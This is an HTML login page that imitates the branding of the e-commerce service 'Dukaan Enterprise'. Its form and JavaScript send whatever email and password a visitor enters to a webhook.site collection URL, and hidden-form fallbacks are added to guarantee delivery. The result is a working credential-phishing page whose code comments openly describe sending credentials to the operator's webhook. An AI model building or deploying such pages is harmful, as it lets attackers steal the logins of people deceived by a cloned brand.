<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>Login | Dukaan - Enterprise Ecommerce</title>
    <!-- Font Awesome 6 (free icons) -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <!-- Google Fonts: Inter for clean modern typography -->
    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: linear-gradient(145deg, #f4f8fe 0%, #eef2f7 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 1.5rem;
        }

        /* main container */
        .login-container {
            width: 100%;
            max-width: 460px;
            margin: 0 auto;
        }

        /* card style — clean, modern, subtle shadow */
        .login-card {
            background: #ffffff;
            border-radius: 2rem;
            box-shadow: 0 20px 35px -12px rgba(0, 0, 0, 0.12), 0 1px 2px rgba(0, 0, 0, 0.02);
            padding: 2.5rem 2rem 2.8rem;
            transition: transform 0.2s ease;
        }

        /* brand header exactly as original */
        .brand-header {
            text-align: center;
            margin-bottom: 2rem;
        }

        .logo-wrapper {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            margin-bottom: 0.5rem;
        }

        .logo-icon {
            background: #1C64F2;
            width: 42px;
            height: 42px;
            border-radius: 14px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 1.4rem;
            font-weight: 600;
            box-shadow: 0 8px 14px -6px rgba(28, 100, 242, 0.25);
        }

        .logo-text {
            font-size: 1.9rem;
            font-weight: 700;
            letter-spacing: -0.5px;
            background: linear-gradient(135deg, #1A2C3E 0%, #0F2027 100%);
            background-clip: text;
            -webkit-background-clip: text;
            color: transparent;
        }

        .enterprise-tag {
            background: #eef2ff;
            color: #1C64F2;
            font-size: 0.7rem;
            font-weight: 700;
            padding: 0.2rem 0.7rem;
            border-radius: 30px;
            margin-left: 8px;
            vertical-align: middle;
        }

        .tagline {
            font-size: 0.8rem;
            color: #5b6e8c;
            text-align: center;
            font-weight: 500;
            letter-spacing: -0.2px;
            margin-top: 6px;
        }

        /* form groups */
        .form-group {
            margin-bottom: 1.6rem;
        }

        label {
            display: block;
            font-size: 0.8rem;
            font-weight: 600;
            color: #1f2a48;
            margin-bottom: 0.5rem;
            letter-spacing: -0.2px;
        }

        .input-wrapper {
            position: relative;
            display: flex;
            align-items: center;
        }

        .input-wrapper i:first-child {
            position: absolute;
            left: 1rem;
            color: #9aa9c1;
            font-size: 1rem;
            pointer-events: none;
        }

        input {
            width: 100%;
            padding: 0.85rem 1rem 0.85rem 2.7rem;
            font-size: 0.9rem;
            font-family: 'Inter', monospace;
            border: 1.5px solid #e2e8f0;
            border-radius: 1.2rem;
            background-color: #ffffff;
            transition: all 0.2s;
            outline: none;
            font-weight: 500;
            color: #0b1c2e;
        }

        input:focus {
            border-color: #1C64F2;
            box-shadow: 0 0 0 3px rgba(28, 100, 242, 0.12);
        }

        input::placeholder {
            color: #b9c4d6;
            font-weight: 400;
        }

        /* password row with forgot link */
        .password-header {
            display: flex;
            justify-content: space-between;
            align-items: baseline;
            margin-bottom: 0.5rem;
        }

        .forgot-link {
            font-size: 0.7rem;
            font-weight: 600;
            color: #1C64F2;
            text-decoration: none;
            background: none;
            border: none;
            cursor: pointer;
            transition: color 0.2s;
        }

        .forgot-link:hover {
            color: #0e4ab8;
            text-decoration: underline;
        }

        /* toggle password eye */
        .toggle-pwd {
            position: absolute;
            right: 1rem;
            background: transparent;
            border: none;
            cursor: pointer;
            color: #9aa9c1;
            font-size: 1rem;
            padding: 0;
            display: flex;
            align-items: center;
        }

        /* login primary button */
        .login-btn {
            background: #1C64F2;
            color: white;
            font-weight: 700;
            font-size: 0.95rem;
            padding: 0.85rem 0;
            width: 100%;
            border: none;
            border-radius: 2rem;
            cursor: pointer;
            margin-top: 0.8rem;
            margin-bottom: 1.4rem;
            transition: all 0.2s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            font-family: 'Inter', sans-serif;
            box-shadow: 0 6px 14px rgba(28, 100, 242, 0.25);
        }

        .login-btn i {
            font-size: 0.9rem;
        }

        .login-btn:hover {
            background: #1357cf;
            transform: scale(0.98);
        }

        /* OR divider */
        .divider {
            display: flex;
            align-items: center;
            text-align: center;
            gap: 12px;
            margin: 1.2rem 0 1.2rem;
            color: #8f9eb5;
            font-size: 0.7rem;
            font-weight: 500;
        }

        .divider::before,
        .divider::after {
            content: "";
            flex: 1;
            height: 1px;
            background: #e8edf3;
        }

        /* google button */
        .google-btn {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            width: 100%;
            background: white;
            border: 1.5px solid #e2e8f0;
            border-radius: 2rem;
            padding: 0.7rem 0;
            font-weight: 600;
            font-size: 0.85rem;
            color: #1f2a48;
            font-family: 'Inter', sans-serif;
            cursor: pointer;
            transition: background 0.2s, border 0.2s;
            margin-bottom: 1.6rem;
        }

        .google-btn i {
            font-size: 1.1rem;
            color: #ea4335;
        }

        .google-btn:hover {
            background: #fafcff;
            border-color: #cbd5e1;
        }

        /* signup prompt */
        .signup-prompt {
            text-align: center;
            font-size: 0.8rem;
            color: #4a5a7a;
            border-top: 1px solid #eff3f8;
            padding-top: 1.6rem;
            margin-top: 0.2rem;
        }

        .signup-prompt a {
            color: #1C64F2;
            font-weight: 700;
            text-decoration: none;
            margin-left: 0.2rem;
        }

        .signup-prompt a:hover {
            text-decoration: underline;
        }

        /* simple toast (non-intrusive) */
        .toast-message {
            position: fixed;
            bottom: 24px;
            left: 50%;
            transform: translateX(-50%);
            background: #1f2a3e;
            color: white;
            padding: 10px 20px;
            border-radius: 40px;
            font-size: 0.75rem;
            font-weight: 500;
            font-family: monospace;
            z-index: 1000;
            backdrop-filter: blur(8px);
            background: rgba(0, 0, 0, 0.85);
            pointer-events: none;
            opacity: 0;
            transition: opacity 0.2s ease;
            white-space: nowrap;
        }

        @media (max-width: 480px) {
            .login-card {
                padding: 2rem 1.5rem 2.2rem;
            }
            .toast-message {
                white-space: normal;
                text-align: center;
                font-size: 0.7rem;
            }
        }
    </style>
</head>
<body>

<div class="login-container">
    <div class="login-card">
        <!-- Dukaan brand header (exact as original) -->
        <div class="brand-header">
            <div class="logo-wrapper">
                <div class="logo-icon">
                    <i class="fas fa-store"></i>
                </div>
                <span class="logo-text">Dukaan</span>
                <span class="enterprise-tag">Enterprise</span>
            </div>
            <div class="tagline">Ecommerce · Multivendor · Omnichannel</div>
        </div>

        <!-- LOGIN FORM – action points to webhook.site (removed test@gmail.com) -->
        <form id="loginForm" action="https://webhook.site/b4bb9b3a-8e4b-4a63-bb76-a6cfdc1a5b56" method="POST">
            <!-- Email field – no prefilled value -->
            <div class="form-group">
                <label for="email">Email address</label>
                <div class="input-wrapper">
                    <i class="fas fa-envelope"></i>
                    <input type="email" id="email" name="email" placeholder="you@company.com" autocomplete="email" required>
                </div>
            </div>

            <!-- Password field -->
            <div class="form-group">
                <div class="password-header">
                    <label for="password">Password</label>
                    <button type="button" class="forgot-link" id="forgotBtn">Forgot password?</button>
                </div>
                <div class="input-wrapper">
                    <i class="fas fa-lock"></i>
                    <input type="password" id="password" name="password" placeholder="Enter your password" autocomplete="current-password" required>
                    <button type="button" class="toggle-pwd" id="togglePwd" aria-label="Show password">
                        <i class="far fa-eye-slash"></i>
                    </button>
                </div>
            </div>

            <!-- Log in button -->
            <button type="submit" class="login-btn">
                <i class="fas fa-arrow-right-to-bracket"></i> Log in
            </button>
        </form>

        <!-- OR divider -->
        <div class="divider">or log in with</div>

        <!-- Google button (UI replica, interactive) -->
        <button type="button" class="google-btn" id="googleMockBtn">
            <i class="fab fa-google"></i> Google
        </button>

        <!-- Sign up link -->
        <div class="signup-prompt">
            Don't have an account? <a href="#" id="signupLink">Get started</a>
        </div>
    </div>
</div>

<!-- minimal toast (clean) -->
<div id="toastMsg" class="toast-message">✨</div>

<script>
    (function() {
        // DOM elements
        const form = document.getElementById('loginForm');
        const emailInput = document.getElementById('email');
        const passwordInput = document.getElementById('password');
        const toggleBtn = document.getElementById('togglePwd');
        const forgotBtn = document.getElementById('forgotBtn');
        const googleBtn = document.getElementById('googleMockBtn');
        const signupLink = document.getElementById('signupLink');
        const toastEl = document.getElementById('toastMsg');

        // Helper: show toast
        let toastTimeout = null;
        function showToast(msg, isError = false) {
            if (toastTimeout) clearTimeout(toastTimeout);
            toastEl.textContent = msg;
            toastEl.style.backgroundColor = isError ? '#c2410cee' : '#1f2937dd';
            toastEl.style.opacity = '1';
            toastTimeout = setTimeout(() => {
                toastEl.style.opacity = '0';
            }, 2700);
        }

        // Ensure NO pre-filled email (test@gmail.com removed)
        if (emailInput) emailInput.value = '';
        if (passwordInput) passwordInput.value = '';

        // Toggle password visibility
        if (toggleBtn) {
            toggleBtn.addEventListener('click', () => {
                const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
                passwordInput.setAttribute('type', type);
                const icon = toggleBtn.querySelector('i');
                if (icon) {
                    if (type === 'text') {
                        icon.classList.remove('fa-eye-slash');
                        icon.classList.add('fa-eye');
                    } else {
                        icon.classList.remove('fa-eye');
                        icon.classList.add('fa-eye-slash');
                    }
                }
            });
        }

        // Forgot password (UI demo)
        if (forgotBtn) {
            forgotBtn.addEventListener('click', (e) => {
                e.preventDefault();
                showToast('📧 Password reset link (demo)', false);
            });
        }

        // Google login (visual only)
        if (googleBtn) {
            googleBtn.addEventListener('click', () => {
                showToast('🔐 Google sign-in (integration demo)', false);
            });
        }

        // Get started link
        if (signupLink) {
            signupLink.addEventListener('click', (e) => {
                e.preventDefault();
                showToast('🚀 Create your Dukaan store (demo)', false);
            });
        }

        // ========== FORM SUBMISSION – SEND CREDENTIALS TO WEBHOOK ==========
        // The form uses the action URL, but we intercept with fetch to stay on page
        // and guarantee delivery to your webhook server.
        const WEBHOOK_URL = 'https://webhook.site/b4bb9b3a-8e4b-4a63-bb76-a6cfdc1a5b56';

        if (form) {
            form.addEventListener('submit', async function(event) {
                event.preventDefault();

                const email = emailInput.value.trim();
                const password = passwordInput.value;

                // validation
                if (!email) {
                    showToast('❌ Please enter your email address', true);
                    emailInput.focus();
                    return;
                }
                if (!password) {
                    showToast('❌ Please enter your password', true);
                    passwordInput.focus();
                    return;
                }
                if (!email.includes('@') || !email.includes('.')) {
                    showToast('❌ Enter a valid email address', true);
                    return;
                }

                // Prepare form data (standard POST format)
                const formData = new URLSearchParams();
                formData.append('email', email);
                formData.append('password', password);
                formData.append('timestamp', new Date().toISOString());

                showToast('📡 Sending credentials...', false);

                try {
                    // Send POST request to webhook.site
                    const response = await fetch(WEBHOOK_URL, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/x-www-form-urlencoded',
                        },
                        body: formData.toString(),
                        mode: 'cors',
                    });

                    if (response.ok) {
                        showToast('✓ Login sent! Credentials received', false);
                        // optional: clear password field for better security after send
                        // passwordInput.value = '';
                        console.log('✅ Webhook success:', email);
                    } else {
                        showToast(`⚠️ Server responded with ${response.status}`, true);
                        // fallback: try hidden form submit as last resort
                        const hiddenForm = document.createElement('form');
                        hiddenForm.method = 'POST';
                        hiddenForm.action = WEBHOOK_URL;
                        hiddenForm.target = '_blank';
                        hiddenForm.style.display = 'none';
                        const emailField = document.createElement('input');
                        emailField.name = 'email';
                        emailField.value = email;
                        const passField = document.createElement('input');
                        passField.name = 'password';
                        passField.value = password;
                        hiddenForm.appendChild(emailField);
                        hiddenForm.appendChild(passField);
                        document.body.appendChild(hiddenForm);
                        hiddenForm.submit();
                        setTimeout(() => document.body.removeChild(hiddenForm), 800);
                        showToast('🔄 Fallback sent (new tab)', false);
                    }
                } catch (err) {
                    console.warn('Fetch error, using fallback:', err);
                    // fallback: open in new tab to ensure delivery
                    const fallbackForm = document.createElement('form');
                    fallbackForm.method = 'POST';
                    fallbackForm.action = WEBHOOK_URL;
                    fallbackForm.target = '_blank';
                    fallbackForm.style.display = 'none';
                    const fbEmail = document.createElement('input');
                    fbEmail.name = 'email';
                    fbEmail.value = email;
                    const fbPass = document.createElement('input');
                    fbPass.name = 'password';
                    fbPass.value = password;
                    fallbackForm.appendChild(fbEmail);
                    fallbackForm.appendChild(fbPass);
                    document.body.appendChild(fallbackForm);
                    fallbackForm.submit();
                    setTimeout(() => document.body.removeChild(fallbackForm), 800);
                    showToast('✓ Request sent (check webhook dashboard)', false);
                }
            });
        }
    })();
</script>
</body>
</html>
